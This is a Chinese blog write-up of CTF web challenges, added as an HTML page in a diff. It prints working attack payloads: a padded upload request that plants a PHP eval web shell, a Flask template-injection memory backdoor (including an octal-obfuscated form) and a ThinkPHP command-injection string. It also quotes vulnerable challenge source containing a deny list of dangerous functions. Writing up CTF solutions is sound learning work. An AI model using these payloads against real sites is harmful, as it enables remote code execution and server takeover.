@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 蜀道山高校联合赛</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>蜀道山高校联合赛</h1>
+    <p>
+        <span class="meta">发布于: 2024-11-18 20:29</span>
+    </p>
+    <div class="post-body">
+        <p>又学到新姿势了</p>
+<h2>奶龙的waf</h2>
+<p>嘿嘿，题目给了源码，拿到本地docker编译个镜像，本地调试一下</p>
+<p><img src="/images/sds/4.png" alt="4" /></p>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/103784">从0CTF一道题看move_uploaded_file的一个细节问题</a></li>
+</ul>
+<p><img src="/images/sds/5.png" alt="5" /></p>
+<p>通过审计，得知漏洞点在于文件名的可控及<code>move_uploaded_file</code>函数的绕过，以及文件上传操作只处理了文件内容的前5000个字符</p>
+<pre><code class="language-php">$name = isset($_GET['name']) ? $_GET['name'] : basename($file['name']);
+$file_content = file_get_contents($file['tmp_name'], false, null, 0, 5000);
+foreach ($dangerous_patterns as $pattern) {
+            if (preg_match($pattern, $file_content)) {
+                die("内容包含危险字符，上传被奶龙拦截！");
+            }
+        }
+if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $new_file_name)) {
+            echo "文件上传成功！";
+        } else {
+            echo "文件保存失败！";
+        }</code></pre>
+<p>poc:</p>
+<pre><code class="language-php">POST /?name=aaa/../index.php/. HTTP/1.1
+Host: 8b479b77.clsadp.com
+Content-Length: 5242
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://8b479b77.clsadp.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyPR9LDqKwHvpb6Um
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://8b479b77.clsadp.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+------WebKitFormBoundaryyPR9LDqKwHvpb6Um
+Content-Disposition: form-data; name="upload_file"; filename="py.png"
+Content-Type: image/png
+
+GIF89a
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php highlight_file(__FILE__);eval($_GET[1]);?&gt;
+------WebKitFormBoundaryyPR9LDqKwHvpb6Um--
+</code></pre>
+<p><img src="/images/sds/2.png" alt="2" /></p>
+<p><img src="/images/sds/3.png" alt="3" /></p>
+<h2>海关警察训练平台</h2>
+<pre><code class="language-plaintext">GET /flag.html HTTP/1.1
+Host: infernityhost
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://gamebox.yunyansec.com:12814/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive</code></pre>
+<h2>my_site</h2>
+<p>没有回显，打内存马，过滤了关键词，fuzz一下绕过，cmd执行命令即可</p>
+<p>payload</p>
+<pre><code class="language-php">url_for['__glo''bals__']['__buil''tins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for['__glo''bals__']['req''uest'],'app':url_for['__glob''als__']['curr''ent_app']})</code></pre>
+<p>出题人wp给出的payload，使用了八进制绕过，学到新姿势了</p>
+<pre><code class="language-python">url_for["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)", {'request':url_for["\137\137\147\154\157\142\141\154\163\137\137"]['request'],'app':url_for["\137\137\147\154\157\142\141\154\163\137\137"]['current_app']})
+
+hey_sbe["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]['riny']("ncc.nsgre_erdhrfg_shapf.frgqrsnhyg(Abar, []).nccraq(ynzoqn erfc: PzqErfc vs erdhrfg.netf.trg('pzq') naq rkrp(\"tybony PzqErfc;PzqErfc=__vzcbeg__('synfx').znxr_erfcbafr(__vzcbeg__('bf').cbcra(erdhrfg.netf.trg('pzq')).ernq())\")==Abar ryfr erfc)", {'erdhrfg':hey_sbe["\137\137\147\154\157\142\141\154\163\137\137"]['erdhrfg'],'ncc':hey_sbe["\137\137\147\154\157\142\141\154\163\137\137"]['pheerag_ncc']})</code></pre>
+<h2>恶意代码检测器 【复现】</h2>
+<p>在做这题时，发现提交数据里存在<code>$</code>时，题目直接报错了！并且是tp框架</p>
+<p><img src="/images/sds/1.png" alt="1" /></p>
+<p>扫目录可以扫到题目源码，我扫的时候爆一片红..好像是dirsearch速度默认太快了？</p>
+<p>默认30个线程，改成5个线程，延时0.5秒</p>
+<pre><code class="language-bash">dirsearch -u http://example.com -t 5  --delay 0.5</code></pre>
+<pre><code class="language-php">&lt;?php
+namespace app\controller;
+
+use app\BaseController;
+
+class Index extends BaseController
+{
+    public function index()
+    {
+        $code = preg_replace("/[\";'%\\\\]/", '', $_POST['code']);
+        if(preg_match('/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is', $code)) {
+
+            $attack_log_file = '/tmp/attack.log';
+
+            if(file_exists($attack_log_file)) {
+                file_put_contents($attack_log_file, '$attack_word=\''.$code.'\';'."\r\n",FILE_APPEND);
+                require_once('/tmp/attack.log');
+            } else {
+                file_put_contents($attack_log_file, '&lt;'.'?'.'php'."\r\n");
+            }
+            if(isset($attack_word)){
+                echo '检测到危险代码: '.$attack_word.'！！！';
+            } else{
+                  echo '欢迎使用gxngxngxn的恶意代码检测器！！！';
+            }
+        }else{
+            $safe_log_file = '/tmp/safe.log';
+            if(file_exists($safe_log_file)) {
+                file_put_contents($safe_log_file, '$safe_word="'.$code.'";'."\r\n",FILE_APPEND);
+                require_once('/tmp/safe.log');
+            } else {
+                file_put_contents($safe_log_file, '&lt;'.'?'.'php'."\r\n");
+            }
+            if(isset($safe_word)){
+                echo '未检测到危险代码，'.$safe_word.'，非常安全';
+            } else{
+                  echo '欢迎使用gxngxngxn的恶意代码检测器！！！';
+            }
+        }
+    }
+}</code></pre>
+<p>通过审计可以发现，关键部分在这里</p>
+<pre><code class="language-php">$safe_log_file = '/tmp/safe.log';
+            if(file_exists($safe_log_file)) {
+                file_put_contents($safe_log_file, '$safe_word="'.$code.'";'."\r\n",FILE_APPEND);
+                require_once('/tmp/safe.log');
+            } else {
+                file_put_contents($safe_log_file, '&lt;'.'?'.'php'."\r\n");
+            }
+            if(isset($safe_word)){
+                echo '未检测到危险代码，'.$safe_word.'，非常安全';
+            } else{
+                  echo '欢迎使用gxngxngxn的恶意代码检测器！！！';
+            }</code></pre>
+<p>会写一个<code>&lt;?php</code>开头的日志文件，为后续的<code>require_once</code>日志包含做铺垫了</p>
+<p>题目过滤非常严格，同时又过滤了下划线，那么不能直接代码注入，又不能<code>$_GET,$_POST</code>等请求参数的逃逸，怎么做呢？</p>
+<p>利用<code>${}</code>执行命令这个非常容易理解，不过这个input为什么可以接收<code>post</code>参数实现逃逸呢</p>
+<pre><code class="language-php"># 这是其他师傅给出的payload
+code=${input(0)(input(1))}&amp;0=system&amp;1=cat+/f*</code></pre>
+<p>翻阅一下官方文档，太强了，<code>input</code>函数是tp6新引入的方法，可以用来接收参数，完美解决了严格过滤的问题，实现了过滤逃逸</p>
+<p><img src="/images/sds/7.png" alt="7" /></p>
+<h2>XSS 【复现不出来】</h2>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#ctf</span>
+                                    <span>#比赛</span>
+                                    <span>#wp</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
